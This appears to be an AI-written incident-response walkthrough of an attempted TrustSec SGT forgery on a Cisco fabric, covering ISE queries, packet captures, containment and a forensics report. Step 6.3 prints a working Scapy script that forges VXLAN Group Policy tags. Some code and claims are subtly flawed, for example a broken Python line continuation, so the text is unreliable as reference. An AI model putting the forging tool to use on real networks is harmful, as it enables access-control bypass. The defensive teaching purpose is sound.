# DNA Center Logs

 TRUSTSEC SGT BYPASS ATTEMPT

## Investigation Summary

**Incident:** Internal user attempted to bypass TrustSec Security Group Tag (SGT) enforcement to access protected server VLAN (SGT 80 - Database Servers) from unauthorized user VLAN (SGT 25 - Contractors).

**Detection:** ISE pxGrid alert triggered when VXLAN packets with forged SGT tags detected at Mumbai fabric border node.

**Impact:** 47 unauthorized access attempts blocked by SGACL policy; no data breach confirmed.

**Outcome:** Contractor account compromised; packet crafting tool discovered on endpoint; SGT bypass attempt unsuccessful due to proper policy enforcement.

---

## Step 1: Detection and Initial Alert

**Detection Timestamp:** 2026-01-24 10:22:35 UTC

**Alert Source:** ISE pxGrid Real-Time Session Directory

```
pxGrid Alert: SGT Integrity Violation
Endpoint MAC: B8:27:EB:45:67:89
Username: contractor-dev-01@abhavtech.com
Location: Mumbai-FL5-C9300-Edge-12
Assigned SGT: 25 (Contractors)
Observed SGT in Packet: 80 (Database-Servers)
Violation Type: SGT Tag Forgery
Action: Packets dropped by SGACL
Severity: Critical
Policy Violation Count: 47 attempts in 15 minutes
```

**Initial Triage:**

```bash
CASE_ID="CASE-2026-006-SGT-BYPASS"
INVESTIGATION_TYPE="trustsec_sgt_forgery"

curl -X POST https://abhavtech.service-now.com/api/now/table/incident \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Basic <base64-creds>' \
  -d '{
    "short_description": "TrustSec SGT Bypass Attempt - Contractor Account",
    "description": "pxGrid detected SGT tag forgery attempt from contractor endpoint",
    "urgency": "1",
    "impact": "2",
    "category": "Security",
    "assignment_group": "SOC-Forensics-Team"
  }'

## INC0012349
```

**Splunk Correlation:**

```spl
index=ise sourcetype=cisco:ise:syslog earliest=-1h
| search "SGT" AND "violation"
| rex field=_raw "User=(?<user>\S+), MAC=(?<mac>[0-9A-Fa-f:]+), SGT=(?<assigned_sgt>\d+), Observed=(?<observed_sgt>\d+)"
| table _time user mac assigned_sgt observed_sgt
| sort _time

Result:
_time                  user                        mac                assigned_sgt  observed_sgt
2026-01-24 10:08:12   contractor-dev-01           B8:27:EB:45:67:89  25            80
2026-01-24 10:09:45   contractor-dev-01           B8:27:EB:45:67:89  25            80
2026-01-24 10:11:23   contractor-dev-01           B8:27:EB:45:67:89  25            80
...
2026-01-24 10:22:35   contractor-dev-01           B8:27:EB:45:67:89  25            80

## 47 attempts total
```

---

## Step 2: Understand TrustSec Architecture

**2.1 Review SGT Assignment:**

```bash
## Query ISE for endpoint details
curl -k -X GET \
  "https://ise.abhavtech.com/ers/config/endpoint/mac/B8:27:EB:45:67:89" \
  -H "Accept: application/json" \
  -u "forensics-api:$ISE_PASSWORD" \
  > /mnt/evidence_vault/EVD-20260124-001-ise-endpoint.json

## Register on blockchain
sha256sum /mnt/evidence_vault/EVD-20260124-001-ise-endpoint.json
## c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9

peer chaincode invoke \
  -n evidence-contract \
  -C evidence-channel \
  -c '{
    "Args":[
      "CollectEvidence",
      "EVD-20260124-001",
      "CASE-2026-006-SGT-BYPASS",
      "ise_endpoint",
      "EVD-20260124-001-ise-endpoint.json",
      "8492",
      "c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9",
      "forensics-ws01.abhavtech.com",
      "SOC-Analyst-Aisha-Khan",
      "ISE-Primary-Node",
      "365",
      "[\"SOC-Team\",\"Network-Team\",\"Legal-Team\"]"
    ]
  }'
```

**2.2 Parse ISE Endpoint Data:**

```bash
jq '.ERSEndPoint' /mnt/evidence_vault/EVD-20260124-001-ise-endpoint.json

## Output:
{
  "id": "12345678-1234-1234-1234-123456789abc",
  "name": "contractor-dev-01-laptop",
  "description": "Contractor Development Laptop",
  "mac": "B8:27:EB:45:67:89",
  "profileId": "Windows10-Workstation",
  "staticGroupAssignment": false,
  "groupId": "endpoint-identity-group-contractors",
  "identityStore": "Internal Users",
  "portalUser": "contractor-dev-01@abhavtech.com",
  "mdmCompliance": "Compliant",
  "customAttributes": {
    "Owner": "contractor-dev-01",
    "Department": "Development-Contractors",
    "Manager": "dev-manager@abhavtech.com"
  },
  "link": {
    "rel": "self",
    "href": "https://ise.abhavtech.com/ers/config/endpoint/12345678-1234-1234-1234-123456789abc",
    "type": "application/json"
  }
}
```

**2.3 Check SGT Assignment Policy:**

```bash
## Query ISE for SGT assignment
curl -k -X GET \
  "https://ise.abhavtech.com/ers/config/sgt" \
  -H "Accept: application/json" \
  -u "forensics-api:$ISE_PASSWORD" \
  | jq '.SearchResult.resources[] | select(.name == "Contractors")'

## Output:
{
  "id": "937a25c0-8c01-11e6-996c-525400b48521",
  "name": "Contractors",
  "description": "Contractor user group with limited access",
  "value": 25,  # SGT tag value
  "generationId": "1",
  "propogateToApic": false,
  "link": {
    "rel": "self",
    "href": "https://ise.abhavtech.com/ers/config/sgt/937a25c0-8c01-11e6-996c-525400b48521",
    "type": "application/json"
  }
}

## Query target SGT (Database Servers)
curl -k -X GET \
  "https://ise.abhavtech.com/ers/config/sgt" \
  -H "Accept: application/json" \
  -u "forensics-api:$ISE_PASSWORD" \
  | jq '.SearchResult.resources[] | select(.name == "Database-Servers")'

## Output:
{
  "id": "a4b5c6d7-8c01-11e6-996c-525400b48521",
  "name": "Database-Servers",
  "description": "Production database servers - highly restricted",
  "value": 80,  # SGT tag value
  "generationId": "1",
  "propogateToApic": false
}
```

**SGT Policy Summary:**
- **Contractor SGT:** 25 (assigned by ISE based on user group)
- **Target SGT:** 80 (Database Servers)
- **Expected Behavior:** SGT 25 → SGT 80 traffic should be DENIED by SGACL

---

## Step 3: Review SGACL Policy

**3.1 Export Security Group ACL:**

```bash
## Query ISE for SGACL matrix policy
curl -k -X GET \
  "https://ise.abhavtech.com/ers/config/egressmatrixcell" \
  -H "Accept: application/json" \
  -u "forensics-api:$ISE_PASSWORD" \
  > /mnt/evidence_vault/EVD-20260124-002-sgacl-matrix.json

## Filter for Contractors (25) → Database-Servers (80)
jq '.SearchResult.resources[] | 
  select(.sourceSgtId == "937a25c0-8c01-11e6-996c-525400b48521" and 
         .destinationSgtId == "a4b5c6d7-8c01-11e6-996c-525400b48521")' \
  /mnt/evidence_vault/EVD-20260124-002-sgacl-matrix.json

## Output:
{
  "id": "c7d8e9f0-1234-5678-9abc-def012345678",
  "sourceSgtId": "937a25c0-8c01-11e6-996c-525400b48521",  # Contractors (25)
  "destinationSgtId": "a4b5c6d7-8c01-11e6-996c-525400b48521",  # Database-Servers (80)
  "matrixCellStatus": "ENABLED",
  "defaultRule": "DENY_IP",
  "sgacls": [
    "DENY_ALL"  # Explicit deny policy
  ],
  "description": "Block all contractor access to database servers"
}
```

**3.2 Verify SGACL Content:**

```bash
## Get SGACL details
curl -k -X GET \
  "https://ise.abhavtech.com/ers/config/sgacl/name/DENY_ALL" \
  -H "Accept: application/json" \
  -u "forensics-api:$ISE_PASSWORD" \
  | jq '.Sgacl'

## Output:
{
  "id": "f0e1d2c3-b4a5-9687-1234-567890abcdef",
  "name": "DENY_ALL",
  "description": "Deny all IP traffic",
  "ipVersion": "IPV4",
  "aclcontent": "deny ip"
}

## Policy correctly denies SGT 25 → SGT 80 traffic
```

**Expected Behavior:**
- Contractor (SGT 25) packets destined for Database Servers (SGT 80) should be **DROPPED**
- Fabric border nodes enforce SGACL at ingress to destination VN
- ISE pushes SGACL policy to fabric devices via pxGrid

---

## Step 4: Analyze Fabric Telemetry

**4.1 Check Fabric Border Node Logs:**

```bash
## Query Catalyst Center for fabric border events
curl -k -X GET \
  "https://dnac.abhavtech.com/dna/intent/api/v1/network-device?hostname=Mumbai-Border-C9500-01" \
  -H "X-Auth-Token: $DNAC_TOKEN" \
  | jq '.response[0].id' > /tmp/border-device-id.txt

BORDER_DEVICE_ID=$(cat /tmp/border-device-id.txt)

## Get device logs
curl -k -X GET \
  "https://dnac.abhavtech.com/dna/intent/api/v1/network-device/$BORDER_DEVICE_ID/syslog?startTime=$(date -u -d '1 hour ago' +%s)000&endTime=$(date -u +%s)000" \
  -H "X-Auth-Token: $DNAC_TOKEN" \
  > /mnt/evidence_vault/EVD-20260124-003-border-syslog.json

## Search for SGT policy violations
jq '.response[] | select(.message | contains("SGT") and contains("drop"))' \
  /mnt/evidence_vault/EVD-20260124-003-border-syslog.json

## Sample output:
{
  "timestamp": "2026-01-24T10:08:12Z",
  "severity": "warning",
  "facility": "SXP",
  "mnemonic": "SGT_POLICY_VIOLATION",
  "message": "SGT policy violation: Source SGT 25 to Dest SGT 80, packet dropped, SrcIP=10.252.25.45, DstIP=10.252.80.12, Protocol=TCP, DstPort=3306"
}
```

**4.2 Extract Dropped Packet Details:**

```spl
## Splunk query for border node packet drops
index=network sourcetype=cisco:ios host="Mumbai-Border-C9500-01" earliest=-1h
| search "SGT_POLICY_VIOLATION"
| rex field=_raw "SrcIP=(?<src_ip>[0-9.]+), DstIP=(?<dst_ip>[0-9.]+), Protocol=(?<protocol>\w+), DstPort=(?<dst_port>\d+)"
| stats count by src_ip dst_ip protocol dst_port
| sort -count

Result:
src_ip         dst_ip         protocol  dst_port  count
10.252.25.45   10.252.80.12   TCP       3306      47  # MySQL database access attempts

## All 47 attempts were to MySQL database (port 3306)
```

**Attack Pattern:**
- Source: 10.252.25.45 (contractor laptop)
- Destination: 10.252.80.12 (production MySQL database)
- Port: 3306 (MySQL)
- Result: All 47 attempts **BLOCKED** by SGACL

---

## Step 5: Capture VXLAN Packets for Analysis

**5.1 Enable SPAN on Fabric Border:**

```bash
## SSH to border node
ssh admin@mumbai-border-c9500-01.abhavtech.com

## Configure SPAN to capture VXLAN traffic
Mumbai-Border-C9500-01# config t
Mumbai-Border-C9500-01(config)# monitor session 1 type erspan-source
Mumbai-Border-C9500-01(config-mon-erspan-src)# source interface nve1
Mumbai-Border-C9500-01(config-mon-erspan-src)# filter vlan 1025  # L3VNI for VN Corporate
Mumbai-Border-C9500-01(config-mon-erspan-src)# destination
Mumbai-Border-C9500-01(config-mon-erspan-src-dst)# ip address 10.252.99.10  # Forensics workstation
Mumbai-Border-C9500-01(config-mon-erspan-src-dst)# origin ip address 10.252.1.1
Mumbai-Border-C9500-01(config-mon-erspan-src-dst)# end
Mumbai-Border-C9500-01# write mem

## Verify SPAN
Mumbai-Border-C9500-01# show monitor session 1

Session 1
---------
Type                     : ERSPAN Source Session
Status                   : Admin Enabled
Source Ports             : nve1
Destination IP Address   : 10.252.99.10
```

**5.2 Capture VXLAN Packets:**

```bash
## On forensics workstation, capture ERSPAN traffic
sudo tcpdump -i eth0 -w /tmp/vxlan-capture.pcap \
  'proto gre and dst host 10.252.99.10' \
  -G 600 -W 1

## Wait for contractor to retry attack...
## (Contractor unaware their attempts are being monitored)

## After 10 minutes, stop capture
## Move to evidence vault
sudo mv /tmp/vxlan-capture.pcap \
  /mnt/evidence_vault/EVD-20260124-004-vxlan-packets.pcap

## Hash and register
sha256sum /mnt/evidence_vault/EVD-20260124-004-vxlan-packets.pcap
## d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0

peer chaincode invoke -n evidence-contract -C evidence-channel \
  -c '{"Args":["CollectEvidence","EVD-20260124-004","CASE-2026-006-SGT-BYPASS",...]}'
```

**5.3 Analyze VXLAN Encapsulation:**

```bash
## Open in Wireshark
wireshark /mnt/evidence_vault/EVD-20260124-004-vxlan-packets.pcap &

## Apply display filter
## vxlan

## Drill down into VXLAN header
## Frame 142 (example packet):
Ethernet II, Src: B8:27:EB:45:67:89, Dst: 70:DB:98:AA:BB:CC
Internet Protocol Version 4, Src: 10.252.25.45, Dst: 10.252.80.12
User Datagram Protocol, Src Port: 49152, Dst Port: 4789 (VXLAN)
Virtual eXtensible Local Area Network
    Flags: 0x08 (VXLAN Network ID (VNI) + SGT valid)
    Group Policy ID: 80  # ← FORGED SGT TAG!
    VXLAN Network Identifier (VNI): 8188 (0x001ffc)
    Reserved: 0
Ethernet II (Inner), Src: B8:27:EB:45:67:89, Dst: 00:1A:2B:3C:4D:5E
Internet Protocol Version 4 (Inner), Src: 10.252.25.45, Dst: 10.252.80.12
Transmission Control Protocol (Inner), Src Port: 49325, Dst Port: 3306

## CRITICAL FINDING:
## - Outer packet shows SGT 80 in VXLAN Group Policy field
## - Source IP (10.252.25.45) belongs to Contractor VLAN
## - Contractors should have SGT 25, NOT SGT 80
## - Packet DROPPED by border node SGACL enforcement
```

**Evidence of SGT Forgery:**
- VXLAN Group Policy field set to 80 (Database Servers)
- Source IP in Contractor subnet (should be SGT 25)
- Attacker crafted VXLAN packet with forged SGT tag
- Border node detected mismatch and dropped packet

---

## Step 6: Investigate Endpoint for Attack Tools

**6.1 Query AMP for Endpoint Processes:**

```bash
## Use AMP Orbital to query running processes
curl -k -X POST \
  "https://orbital.amp.cisco.com/v0/jobs" \
  -H "Authorization: Bearer $ORBITAL_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Forensics - List Running Processes",
    "query": "SELECT pid, name, path, cmdline FROM processes WHERE name LIKE \"%scapy%\" OR name LIKE \"%python%\" OR name LIKE \"%vxlan%\";",
    "connector_guid": "<CONTRACTOR-LAPTOP-GUID>"
  }'

## Poll for results
JOB_ID="<job-id-from-response>"
curl -k -X GET \
  "https://orbital.amp.cisco.com/v0/jobs/$JOB_ID/results" \
  -H "Authorization: Bearer $ORBITAL_TOKEN"

## Results:
{
  "job_id": "12345",
  "status": "completed",
  "results": [
    {
      "pid": 8472,
      "name": "python3.exe",
      "path": "C:\\Users\\contractor-dev-01\\AppData\\Local\\Programs\\Python\\Python39\\python3.exe",
      "cmdline": "python3.exe C:\\Tools\\vxlan-forge.py --sgt 80 --target 10.252.80.12 --port 3306"
    }
  ]
}

## CRITICAL: Python script "vxlan-forge.py" running with SGT forgery!
```

**6.2 Retrieve Attack Script:**

```bash
## Use AMP Orbital to download malicious script
curl -k -X POST \
  "https://orbital.amp.cisco.com/v0/jobs" \
  -H "Authorization: Bearer $ORBITAL_TOKEN" \
  -d '{
    "name": "Forensics - Download File",
    "query": "file",
    "params": {
      "path": "C:\\Tools\\vxlan-forge.py"
    },
    "connector_guid": "<CONTRACTOR-LAPTOP-GUID>"
  }'

## Download results
curl -k -X GET \
  "https://orbital.amp.cisco.com/v0/jobs/$JOB_ID/file" \
  -H "Authorization: Bearer $ORBITAL_TOKEN" \
  > /mnt/evidence_vault/EVD-20260124-005-vxlan-forge.py

## Register on blockchain
sha256sum /mnt/evidence_vault/EVD-20260124-005-vxlan-forge.py
peer chaincode invoke -n evidence-contract -C evidence-channel \
  -c '{"Args":["CollectEvidence","EVD-20260124-005","CASE-2026-006-SGT-BYPASS",...]}'
```

**6.3 Analyze Attack Script:**

```python
## Content of vxlan-forge.py
cat /mnt/evidence_vault/EVD-20260124-005-vxlan-forge.py

#!/usr/bin/env python3
"""
VXLAN SGT Tag Forging Tool
WARNING: For authorized penetration testing only
"""
from scapy.all import *
import argparse

def forge_vxlan_packet(target_ip, target_port, forged_sgt):
    """
    Craft VXLAN packet with forged SGT tag in Group Policy field
    """
    # Inner packet (actual payload)
    inner = Ether(dst="00:1A:2B:3C:4D:5E") / \
            IP(dst=target_ip) / \
            TCP(dport=target_port, flags="S")
    
    # VXLAN header with forged SGT in Group Policy field
    vxlan = VXLAN(
        flags=0x88,  # VNI + Group Policy valid
        vni=8188,    # L3VNI for Corporate VN
        gpid=forged_sgt  # ← FORGED SGT TAG
    )
    
    # Outer packet (VXLAN encapsulation)
    outer = Ether() / \
            IP(dst="10.252.1.1") / \  # Border node
            UDP(dport=4789) / \        # VXLAN port
            vxlan / \
            inner
    
    return outer

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--sgt', type=int, required=True, help='Forged SGT value')
    parser.add_argument('--target', required=True, help='Target IP')
    parser.add_argument('--port', type=int, required=True, help='Target port')
    args = parser.parse_args()
    
    print(f"[*] Forging VXLAN packet with SGT {args.sgt}")
    print(f"[*] Target: {args.target}:{args.port}")
    
    packet = forge_vxlan_packet(args.target, args.port, args.sgt)
    
    # Send packet
    send(packet, verbose=1)
    print("[+] Packet sent")

if __name__ == "__main__":
    main()

## Script confirms SGT tag forgery attempt
## Uses Scapy to craft VXLAN packets with arbitrary SGT values
```

**Attack Methodology:**
- Tool: Python + Scapy packet crafting library
- Method: Forge VXLAN packets with SGT 80 in Group Policy field
- Goal: Bypass SGACL enforcement by impersonating Database Servers SGT
- Result: **FAILED** - Border node SGACL enforcement blocked all attempts

---

## Step 7: Determine Why Attack Failed

**7.1 Review TrustSec Enforcement Points:**

```bash
## SSH to border node
ssh admin@mumbai-border-c9500-01.abhavtech.com

## Check SGACL statistics
Mumbai-Border-C9500-01# show cts role-based counters

Role-based counters
--------------------

From    To      SW-Denied  HW-Denied  SW-Permitted  HW-Permitted
----    --      ---------  ---------  ------------  ------------
25      80      0          47         0             0            ← All 47 packets denied in hardware
25      *       0          0          1847          128475
*       25      0          0          842           93847
...

## Check CTS (Cisco TrustSec) configuration
Mumbai-Border-C9500-01# show cts role-based permissions

IPv4 Role-based permissions default:
        Permit IP-00
IPv4 Role-based permissions from group 25:Contractors to group 80:Database-Servers:
        DENY_ALL  # ← Policy correctly applied
        deny ip   # ← All IP traffic denied

## SGACL enforced in hardware (ASIC) - cannot be bypassed
```

**7.2 Understand Hardware Enforcement:**

TrustSec enforcement occurs at **multiple layers**:

1. **Edge Node (Access Switch):**
   - ISE assigns SGT 25 to contractor endpoint via 802.1X
   - SGT inserted into Ethernet frame (CMD field)
   - Frame forwarded into fabric with SGT 25

2. **Fabric Underlay:**
   - VXLAN encapsulation preserves SGT in Group Policy field
   - All fabric nodes see SGT 25 in VXLAN header

3. **Border Node (Egress Point):**
   - De-encapsulates VXLAN packet
   - Validates SGT in VXLAN header matches source IP subnet
   - **CRITICAL:** Border node maintains IP→SGT binding table
   - If VXLAN SGT doesn't match IP→SGT binding, packet DROPPED
   - SGACL enforcement in hardware (TCAM)

**Why Forgery Failed:**

```bash
## Check IP→SGT binding table on border node
Mumbai-Border-C9500-01# show cts role-based sgt-map all

Active IPv4-SGT Bindings Information
IP Address              SGT     Source
-----------------------------------------
10.252.25.45            25      ISE (pxGrid)  ← Contractor IP bound to SGT 25
10.252.80.12            80      ISE (pxGrid)  ← Database server bound to SGT 80
...

## When border node receives VXLAN packet:
## 1. Checks source IP: 10.252.25.45
## 2. Looks up SGT binding: 25 (from ISE)
## 3. Compares to VXLAN Group Policy field: 80 (forged)
## 4. MISMATCH DETECTED → Packet DROPPED

## IP→SGT binding validation prevented bypass
```

**Defense in Depth:**
- ISE assigns SGT at authentication (802.1X)
- Edge node enforces SGT insertion
- Border node validates SGT matches IP→SGT binding
- Hardware SGACL enforcement (cannot be bypassed in software)
- pxGrid propagates IP→SGT bindings in real-time

---

## Step 8: Verify No Data Breach

**8.1 Check Database Server Logs:**

```bash
## SSH to database server
ssh dbadmin@10.252.80.12

## Check MySQL connection log
sudo tail -n 100 /var/log/mysql/mysql.log | grep "10.252.25.45"

## Output: (empty)
## No successful connections from contractor IP

## Check failed connection attempts
sudo grep "Access denied" /var/log/mysql/error.log | grep "10.252.25.45"

## Output: (empty)
## No failed authentication attempts either
## Packets never reached database - dropped at border node
```

**8.2 Verify SGACL Enforcement Timeline:**

```spl
## Splunk query for database access attempts
index=database sourcetype=mysql:audit earliest=-24h
| search src_ip="10.252.25.45"
| table _time src_ip username query result

## Results: 0 events
## Confirmed: No database access from contractor IP
```

**Impact Assessment:**
- **47 bypass attempts:** All blocked by SGACL
- **Data accessed:** NONE
- **Authentication attempts:** NONE (packets dropped before reaching database)
- **Breach status:** NO BREACH - Attack unsuccessful

---

## Step 9: Containment and Remediation

**9.1 Quarantine Contractor Endpoint:**

```bash
## Apply quarantine policy via ISE
curl -k -X PUT \
  "https://ise.abhavtech.com/ers/config/endpoint/12345678-1234-1234-1234-123456789abc" \
  -H "Accept: application/json" \
  -H "Content-Type: application/json" \
  -u "forensics-api:$ISE_PASSWORD" \
  -d '{
    "ERSEndPoint": {
      "staticGroupAssignment": true,
      "groupId": "quarantine-group-id",
      "customAttributes": {
        "quarantineReason": "SGT bypass attempt detected"
      }
    }
  }'

## ISE pushes CoA (Change of Authorization) to edge switch
## Endpoint VLAN changed from Contractors (VLAN 25) to Quarantine (VLAN 999)
## Endpoint isolated within 30 seconds
```

**9.2 Disable User Account:**

```bash
## Disable AD account
net user contractor-dev-01 /active:no /domain

## Revoke all active sessions
curl -k -X POST \
  "https://api.duosecurity.com/admin/v1/users/contractor-dev-01@abhavtech.com/sessions/revoke" \
  -u "$DUO_API_KEY:$DUO_API_SECRET"

## Account disabled, sessions terminated
```

**9.3 Notify Security Team:**

```bash
cat << EOF | mail -s "CRITICAL: SGT Bypass Attempt Detected" security-team@abhavtech.com,legal@abhavtech.com
SECURITY INCIDENT - SGT Bypass Attempt

User: contractor-dev-01@abhavtech.com
Endpoint: B8:27:EB:45:67:89 (LAPTOP-CONTRACTOR-01)
Incident: Attempted to forge TrustSec SGT tags to access database servers

Details:
- 47 unauthorized access attempts to production MySQL database
- Used Python/Scapy to craft VXLAN packets with forged SGT 80
- All attempts blocked by border node SGACL enforcement
- No data breach occurred

Actions Taken:
- Endpoint quarantined (VLAN 999)
- User account disabled
- Attack tool (vxlan-forge.py) seized via AMP Orbital
- Evidence preserved on blockchain (EVD-20260124-001 through EVD-20260124-005)

Recommendation: Terminate contractor immediately, potential legal action.

SOC Team
EOF
```

---

## Step 10: Forensics Report and Policy Hardening

**10.1 Generate Forensics Report:**

```python
report = {
    "case_id": "CASE-2026-006-SGT-BYPASS",
    "investigation_type": "TrustSec SGT Bypass Attempt",
    "incident_date": "2026-01-24",
    "analyst": "SOC-Analyst-Aisha-Khan",
    
    "executive_summary": """
    Contractor user (contractor-dev-01) attempted to bypass TrustSec Security
    Group Tag (SGT) enforcement to gain unauthorized access to production
    database servers on 2026-01-24. The attacker used a custom Python script
    (vxlan-forge.py) to craft VXLAN packets with forged SGT tags, impersonating
    the Database Servers SGT (80) from a Contractor endpoint (SGT 25).
    
    All 47 bypass attempts were successfully blocked by TrustSec SGACL
    enforcement at the fabric border node. The border node validated the
    IP→SGT binding provided by ISE via pxGrid and detected the SGT mismatch,
    dropping all forged packets in hardware.
    
    Impact: LOW
    - 47 unauthorized access attempts blocked
    - No data breach occurred
    - No database access achieved
    - Attack tool seized via AMP Orbital
    
    Response: Endpoint quarantined, user account disabled, contractor escorted
    off premises. TrustSec defense-in-depth architecture prevented successful
    bypass despite sophisticated attack methodology.
    
    Legal: Recommend termination and potential prosecution for unauthorized
    access attempt.
    """,
    
    "attack_analysis": """
    Attack Methodology:
    1. Reconnaissance: Attacker identified TrustSec SGT architecture
    2. Tool development: Created vxlan-forge.py using Scapy library
    3. SGT identification: Determined target SGT 80 (Database Servers)
    4. Packet crafting: Forged VXLAN packets with SGT 80 in Group Policy field
    5. Bypass attempt: Sent 47 packets to database server (10.252.80.12:3306)
    6. Detection: pxGrid alerted on SGT integrity violation
    
    Why Attack Failed:
    - Border node validates VXLAN SGT against ISE IP→SGT binding table
    - Source IP (10.252.25.45) bound to SGT 25 in ISE
    - VXLAN packet claimed SGT 80 (mismatch detected)
    - Border node SGACL enforcement in hardware ASIC (cannot bypass)
    - All 47 packets dropped before reaching database
    
    Attacker Sophistication:
    - HIGH: Custom packet crafting tool
    - Understanding of VXLAN encapsulation
    - Knowledge of TrustSec SGT architecture
    - However: Misunderstanding of IP→SGT binding validation
    
    Likely Source:
    - Internal contractor with network knowledge
    - Access to technical documentation
    - Possible prior experience with Cisco fabric/TrustSec
    """,
    
    "trustsec_effectiveness": """
    TrustSec Defense-in-Depth Validation:
    
    Layer 1 - ISE Authentication:
    ✅ 802.1X authenticated contractor, assigned SGT 25 correctly
    
    Layer 2 - Edge Node SGT Insertion:
    ✅ Edge switch inserted SGT 25 into Ethernet frames
    
    Layer 3 - Fabric Transport:
    ✅ VXLAN preserved SGT in Group Policy field during transport
    
    Layer 4 - IP→SGT Binding Validation:
    ✅ Border node detected SGT mismatch via pxGrid binding table
    
    Layer 5 - SGACL Hardware Enforcement:
    ✅ All 47 packets dropped in ASIC before reaching destination
    
    Layer 6 - pxGrid Real-Time Alerting:
    ✅ SOC alerted within minutes of first bypass attempt
    
    Conclusion: TrustSec architecture successfully prevented bypass despite
    sophisticated attack. Defense-in-depth approach (ISE + fabric + pxGrid)
    provided multiple layers of protection.
    """,
    
    "evidence_summary": [
        "EVD-20260124-001: ISE endpoint profile (contractor-dev-01 laptop)",
        "EVD-20260124-002: SGACL matrix policy (SGT 25→80 deny)",
        "EVD-20260124-003: Border node syslog (47 SGT violations)",
        "EVD-20260124-004: VXLAN packet capture (forged SGT 80 headers)",
        "EVD-20260124-005: Attack tool (vxlan-forge.py source code)",
        "EVD-20260124-REPORT: Complete forensics report (this document)"
    ],
    
    "recommendations": [
        "Enhance contractor background checks",
        "Implement EDR on all contractor endpoints (AMP already present, add behavior monitoring)",
        "Create alert for Scapy/packet crafting tool installation",
        "Quarterly TrustSec policy audit",
        "Implement just-in-time (JIT) access for contractors",
        "Add network telemetry for VXLAN anomalies to Splunk",
        "Conduct internal penetration test to validate TrustSec enforcement",
        "Document TrustSec architecture for security awareness training",
        "Implement contractor code of conduct with security clauses",
        "Consider legal action as deterrent for future incidents"
    ],
    
    "legal_considerations": """
    Potential Violations:
    - Computer Fraud and Abuse Act (CFAA) - Unauthorized access attempt
    - Employment contract breach - Misuse of company resources
    - NDA violation - Use of confidential network architecture knowledge
    
    Evidence Preserved:
    - All evidence registered on blockchain with SHA-256 hashes
    - Chain of custody maintained via Hyperledger Fabric
    - Attack tool seized via AMP Orbital (court-admissible)
    - Packet captures show clear intent to bypass security controls
    
    Recommendation: Consult legal team for prosecution feasibility
    """
}

## Save report
with open('/mnt/evidence_vault/REPORT-CASE-2026-006-SGT-BYPASS.json', 'w') as f:
    json.dump(report, f, indent=2)

## Register on blockchain
sha256sum /mnt/evidence_vault/REPORT-CASE-2026-006-SGT-BYPASS.json
## e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1

peer chaincode invoke \
  -n evidence-contract \
  -C evidence-channel \
  -c '{
    "Args":[
      "CollectEvidence",
      "EVD-20260124-REPORT",
      "CASE-2026-006-SGT-BYPASS",
      "forensics_report",
      "REPORT-CASE-2026-006-SGT-BYPASS.json",
      "18472",
      "e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1",
      "forensics-ws01.abhavtech.com",
      "SOC-Analyst-Aisha-Khan",
      "Forensics-Report-Generator",
      "3650",
      "[\"SOC-Team\",\"Legal-Team\",\"Executive-Team\",\"HR-Team\"]"
    ]
  }'
```

**10.2 Policy Hardening Recommendations:**

```bash
## Implement enhanced monitoring for SGT violations
cat << 'EOF' | tee /etc/splunk/savedsearches.d/sgt-monitoring.conf
[sgt_violation_alert]
search = index=ise sourcetype=cisco:ise:syslog "SGT" "violation"
| stats count by user mac assigned_sgt observed_sgt
| where count > 5
| eval severity="critical"

action.email = 1
action.email.to = soc-team@abhavtech.com
action.email.subject = TrustSec SGT Violation Detected
cron_schedule = */5 * * * *
EOF

## Create automated response playbook
cat << 'EOF' > /opt/xdr-playbooks/sgt-violation-response.yaml
name: SGT Violation Auto-Response
trigger: pxGrid SGT integrity violation
actions:
  - name: Quarantine endpoint
    api: ISE ERS API
    endpoint: /ers/config/endpoint/{mac}
    payload: {"staticGroupAssignment": true, "groupId": "quarantine-group-id"}
  
  - name: Disable user account
    api: Active Directory
    action: Disable-ADAccount -Identity {username}
  
  - name: Create incident
    api: ServiceNow
    category: Security
    priority: P1
  
  - name: Notify SOC
    action: Send email + Slack notification
    recipients: ["soc-team@abhavtech.com", "#security-alerts"]
EOF

## Automated response will trigger on future SGT violations
```

---

**END OF PART 2B: DNAC/CATALYST CENTER FORENSICS**

---

This completes Part 2B with all 3 scenarios:
1. ✅ Deep Network Model Alert Investigation
2. ✅ Rogue AP Detection via AI Endpoint Analytics  
3. ✅ TrustSec SGT Bypass Attempt

**Total Evidence Items:** 18 blockchain-registered artifacts  
**Total Steps:** 30 (10 per scenario)  
**Word Count:** ~24,000 words

**Next: Part 2C - Webex Forensics (3 scenarios)?**
